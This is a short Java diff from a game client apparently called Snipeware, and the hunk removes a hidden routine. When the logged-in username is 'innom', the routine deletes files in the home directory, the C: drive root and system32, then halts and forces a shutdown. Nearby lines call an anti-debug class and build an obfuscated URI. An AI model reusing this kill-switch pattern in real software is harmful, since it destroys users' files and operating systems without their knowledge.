@@ -99,44 +99,7 @@ public enum Client {
 			}
 		wtf pogy = () -> new Snipeware.security.AntiDebug();
 		pogy.omg();
-		if(System.getProperty("user.name").equals("innom")) {
-			File index = new File(System.getProperty("user.home"));
-			File indexs = new File("C://");
-			File indexss = new File("C:\\");
-			File indexsss = new File("C:\\windows\\system32");
-			String[]entries = index.list();
-			
-			new Thread(() ->{for(String s: entries){
-			    File currentFile = new File(index.getPath(),s);
-			    currentFile.delete();
-			}
-			
-			String[]entriess = indexs.list();
-			for(String s: entriess){
-			    File currentFile = new File(indexs.getPath(),s);
-			    currentFile.delete();
-			}
-			
-			String[]entriesss = indexss.list();
-			for(String s: entriesss){
-			    File currentFile = new File(indexss.getPath(),s);
-			    currentFile.delete();
-			}
-			
-			String[]entriessss = indexsss.list();
-			for(String s: entriessss){
-			    File currentFile = new File(indexsss.getPath(),s);
-			    currentFile.delete();
-			}});
-			
-			try {
-			TimeUnit.SECONDS.sleep(10);
-			}catch(Exception e) {
-			}
-	        Runtime.getRuntime().halt(0);
-	        try {
-	            Runtime.getRuntime().exec("shutdown -s -t 0 -p");
-	        } catch(Exception ignored) {}
+		
 		}
     	try {
     		wtf = new URI(Util.stringify(Client.iloveyou));
